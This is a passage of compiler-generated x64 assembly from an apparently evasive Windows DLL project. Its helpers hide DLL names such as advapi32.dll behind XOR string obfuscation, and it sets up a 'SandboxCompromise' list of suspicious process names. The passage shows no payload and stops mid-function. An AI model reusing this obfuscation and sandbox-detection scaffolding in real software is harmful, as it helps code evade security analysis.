text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??__Fntdll@freqDLLS@ProcessUtilities@@YAXXZ
text$yd	SEGMENT
??__Fntdll@freqDLLS@ProcessUtilities@@YAXXZ PROC	; ProcessUtilities::freqDLLS::`dynamic atexit destructor for 'ntdll'', COMDAT
	sub	rsp, 40					; 00000028H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR ?ntdll@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B+24
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN20@dynamic
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR ?ntdll@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rax, rcx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN34@dynamic

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H
	sub	rax, rcx

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	SHORT $LN43@dynamic
$LN34@dynamic:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN20@dynamic:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	movdqa	xmm0, XMMWORD PTR __xmm@000000000000000f0000000000000000
	movdqa	XMMWORD PTR ?ntdll@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B+16, xmm0

; 4876 :         _My_data._Myres  = _Small_string_capacity;
; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR ?ntdll@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B, 0
	add	rsp, 40					; 00000028H
	ret	0
$LN43@dynamic:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN41@dynamic:
??__Fntdll@freqDLLS@ProcessUtilities@@YAXXZ ENDP	; ProcessUtilities::freqDLLS::`dynamic atexit destructor for 'ntdll''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??__Fobfuscated_data@?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@YAXXZ
text$yd	SEGMENT
??__Fobfuscated_data@?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@YAXXZ PROC ; `ProcessUtilities::freqDLLS::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data'', COMDAT
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	edx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4V45@A
	mov	rax, QWORD PTR [rax+rcx*8]

; 132  : 				m_data[i] = 0;

	mov	QWORD PTR [rax+rdx], 0
	mov	WORD PTR [rax+rdx+8], 0
	ret	0
??__Fobfuscated_data@?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@YAXXZ ENDP ; `ProcessUtilities::freqDLLS::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
;	COMDAT ??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ
_TEXT	SEGMENT
this$dead$ = 48
??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ PROC ; ProcessUtilities::freqDLLS::<lambda_3>::operator(), COMDAT

; 34   : 		static const std::string advapi32 = std::string(HIDE("advapi32.dll"));

	push	rbx
	sub	rsp, 32					; 00000020H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@4V45@A
	test	al, 1
	jne	SHORT $LN26@operator
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [rdx+r8]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	DWORD PTR [rbx+10], 33376613		; 01fd4965H
	mov	DWORD PTR [rbx], 1149181722		; 447f1f1aH
	mov	DWORD PTR [rbx+4], -777894771		; d1a2448dH
	mov	WORD PTR [rbx+8], 8021			; 00001f55H
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 34   : 		static const std::string advapi32 = std::string(HIDE("advapi32.dll"));

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@YAXXZ ; `ProcessUtilities::freqDLLS::<lambda_3>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	mov	rax, rbx
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN26@operator:
	lea	rax, QWORD PTR [rdx+r8]
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ ENDP ; ProcessUtilities::freqDLLS::<lambda_3>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
this$dead$ = 48
?dtor$0@?0???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@4HA PROC ; `ProcessUtilities::freqDLLS::<lambda_3>::operator()'::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@4HA ENDP ; `ProcessUtilities::freqDLLS::<lambda_3>::operator()'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
;	COMDAT ??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ
text$di	SEGMENT
??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ PROC	; ProcessUtilities::freqDLLS::`dynamic initializer for 'advapi32'', COMDAT

; 34   : 		static const std::string advapi32 = std::string(HIDE("advapi32.dll"));

	push	rbx
	sub	rsp, 32					; 00000020H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	ebx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@4V45@A
	add	rbx, rdx
	test	al, 1
	jne	SHORT $LN47@dynamic
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	DWORD PTR [rbx+10], 33376613		; 01fd4965H
	mov	DWORD PTR [rbx], 1149181722		; 447f1f1aH
	mov	DWORD PTR [rbx+4], -777894771		; d1a2448dH
	mov	WORD PTR [rbx+8], 8021			; 00001f55H
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 34   : 		static const std::string advapi32 = std::string(HIDE("advapi32.dll"));

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@YAXXZ ; `ProcessUtilities::freqDLLS::<lambda_3>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
$LN47@dynamic:
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rbx+13], 0
	je	$LN15@dynamic

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	r8d, r8d
	cmp	DWORD PTR __isa_available, 5
	jl	$LN56@dynamic

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movdqa	xmm3, XMMWORD PTR __xmm@e3912dfd25097b7be3912dfd25097b7b
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000008000000000000000800
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+2]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+2], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+4]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+4], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+6]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+6], ax

; 68   : 		for ( size_type i = 0; i < size; i++ )

	mov	r8d, 8
$LN56@dynamic:
	mov	r9, -2048805790205510789		; e3912dfd25097b7bH
	npad	6
$LL55@dynamic:

; 69   : 		{
; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, r8b
	and	cl, 7
	shl	cl, 3
	mov	rdx, r9
	shr	rdx, cl
	xor	BYTE PTR [rbx+r8], dl

; 68   : 		for ( size_type i = 0; i < size; i++ )

	inc	r8
	cmp	r8, 13
	jb	SHORT $LL55@dynamic

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [rbx+13], 0
$LN15@dynamic:
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 34   : 		static const std::string advapi32 = std::string(HIDE("advapi32.dll"));

	mov	rdx, rbx
	lea	rcx, OFFSET FLAT:?advapi32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	lea	rcx, OFFSET FLAT:??__Fadvapi32@freqDLLS@ProcessUtilities@@YAXXZ ; ProcessUtilities::freqDLLS::`dynamic atexit destructor for 'advapi32''
	add	rsp, 32					; 00000020H
	pop	rbx
	jmp	atexit
??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ ENDP	; ProcessUtilities::freqDLLS::`dynamic initializer for 'advapi32''
text$di	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
?dtor$0@?0???__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ@4HA PROC ; `ProcessUtilities::freqDLLS::`dynamic initializer for 'advapi32'''::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ@4HA ENDP ; `ProcessUtilities::freqDLLS::`dynamic initializer for 'advapi32'''::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??__Fadvapi32@freqDLLS@ProcessUtilities@@YAXXZ
text$yd	SEGMENT
??__Fadvapi32@freqDLLS@ProcessUtilities@@YAXXZ PROC	; ProcessUtilities::freqDLLS::`dynamic atexit destructor for 'advapi32'', COMDAT
	sub	rsp, 40					; 00000028H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR ?advapi32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B+24
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN20@dynamic
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR ?advapi32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rax, rcx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN34@dynamic

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H
	sub	rax, rcx

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	SHORT $LN43@dynamic
$LN34@dynamic:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN20@dynamic:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	movdqa	xmm0, XMMWORD PTR __xmm@000000000000000f0000000000000000
	movdqa	XMMWORD PTR ?advapi32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B+16, xmm0

; 4876 :         _My_data._Myres  = _Small_string_capacity;
; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR ?advapi32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B, 0
	add	rsp, 40					; 00000028H
	ret	0
$LN43@dynamic:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN41@dynamic:
??__Fadvapi32@freqDLLS@ProcessUtilities@@YAXXZ ENDP	; ProcessUtilities::freqDLLS::`dynamic atexit destructor for 'advapi32''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??__Fobfuscated_data@?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@YAXXZ
text$yd	SEGMENT
??__Fobfuscated_data@?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@YAXXZ PROC ; `ProcessUtilities::freqDLLS::<lambda_3>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data'', COMDAT
	mov	rax, QWORD PTR gs:88
	mov	ecx, DWORD PTR _tls_index
	mov	edx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@4V45@A
	add	rdx, QWORD PTR [rax+rcx*8]

; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	mov	QWORD PTR [rdx], rax
	mov	DWORD PTR [rdx+8], eax
	mov	BYTE PTR [rdx+12], al
	ret	0
??__Fobfuscated_data@?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@YAXXZ ENDP ; `ProcessUtilities::freqDLLS::<lambda_3>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\initializer_list
;	COMDAT ??0?$initializer_list@PEBD@std@@QEAA@PEBQEBD0@Z
_TEXT	SEGMENT
this$ = 8
_First_arg$ = 16
_Last_arg$ = 24
??0?$initializer_list@PEBD@std@@QEAA@PEBQEBD0@Z PROC	; std::initializer_list<char const *>::initializer_list<char const *>, COMDAT

; 34   :         : _First(_First_arg), _Last(_Last_arg) {}

	mov	QWORD PTR [rcx], rdx
	mov	rax, rcx
	mov	QWORD PTR [rcx+8], r8
	ret	0
??0?$initializer_list@PEBD@std@@QEAA@PEBQEBD0@Z ENDP	; std::initializer_list<char const *>::initializer_list<char const *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??0?$allocator@PEBD@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0?$allocator@PEBD@std@@QEAA@XZ PROC			; std::allocator<char const *>::allocator<char const *>, COMDAT

; 939  :     constexpr allocator() noexcept {}

	mov	rax, rcx
	ret	0
??0?$allocator@PEBD@std@@QEAA@XZ ENDP			; std::allocator<char const *>::allocator<char const *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\initializer_list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\initializer_list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ??0?$vector@PEBDV?$allocator@PEBD@std@@@std@@QEAA@V?$initializer_list@PEBD@1@AEBV?$allocator@PEBD@1@@Z
_TEXT	SEGMENT
__$ArrayPad$ = 32
this$dead$ = 64
_Ilist$ = 72
_Al$dead$ = 80
??0?$vector@PEBDV?$allocator@PEBD@std@@@std@@QEAA@V?$initializer_list@PEBD@1@AEBV?$allocator@PEBD@1@@Z PROC ; std::vector<char const *,std::allocator<char const *> >::vector<char const *,std::allocator<char const *> >, COMDAT

; 651  :         : _Mypair(_One_then_variadic_args_t{}, _Al) {

$LN118:
	mov	QWORD PTR [rsp+8], rbx
	mov	QWORD PTR [rsp+24], rsi
	push	rdi
	sub	rsp, 48					; 00000030H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax

; 652  :         _Construct_n(_Convert_size<size_type>(_Ilist.size()), _Ilist.begin(), _Ilist.end());

	mov	rsi, QWORD PTR [rdx]

; 400  :     _CONSTEXPR20 _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

	xor	eax, eax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\initializer_list

; 45   :         return static_cast<size_t>(_Last - _First);

	mov	rdi, QWORD PTR [rdx+8]
	xorps	xmm0, xmm0
	sub	rdi, rsi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 400  :     _CONSTEXPR20 _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A+16, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\initializer_list

; 45   :         return static_cast<size_t>(_Last - _First);

	mov	rbx, rdi
	sar	rbx, 3
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 400  :     _CONSTEXPR20 _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

	movdqu	XMMWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A, xmm0

; 2069 :         if (_Count != 0) {

	test	rbx, rbx
	je	$LN78@vector

; 2010 :         if (_Newcapacity > max_size()) {

	mov	rcx, 2305843009213693951		; 1fffffffffffffffH
	cmp	rbx, rcx
	ja	$LN115@vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 89   :     return _Count * _Ty_size;

	lea	rbx, QWORD PTR [rbx*8]

; 196  :     if (_Bytes == 0) {

	test	rbx, rbx
	je	SHORT $LN29@vector

; 197  :         return nullptr;
; 198  :     }
; 199  : 
; 200  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 201  :     if (_STD is_constant_evaluated()) {
; 202  :         return _Traits::_Allocate(_Bytes);
; 203  :     }
; 204  : #endif // _HAS_CXX20
; 205  : 
; 206  : #ifdef __cpp_aligned_new
; 207  :     if constexpr (_Align > __STDCPP_DEFAULT_NEW_ALIGNMENT__) {
; 208  :         size_t _Passed_align = _Align;
